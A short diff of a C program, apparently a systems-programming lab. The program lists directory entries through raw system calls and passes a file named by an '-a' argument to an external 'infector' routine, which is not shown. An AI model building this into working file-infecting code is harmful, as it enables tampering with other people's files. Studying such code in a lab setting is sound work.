@@ -14,7 +14,6 @@
 
 extern int system_call();
 extern void infector(char *);
-extern int code_start(char *);
 
 struct linux_dirent
 {
@@ -58,7 +57,7 @@ int main(int argc, char *argv[])
             if (strncmp(argv[arg], "-a", 2) == 0 &&
                 strncmp(argv[arg] + 2, (d->d_name) - 1, strlen(d->d_name) + 1) == 0)
             {
-                infector(d->d_name);
+                infector(d->d_name - 1);
                 system_call(SYS_WRITE, STDOUT, msg, sizeof(msg) - 1);
                 break;
             }
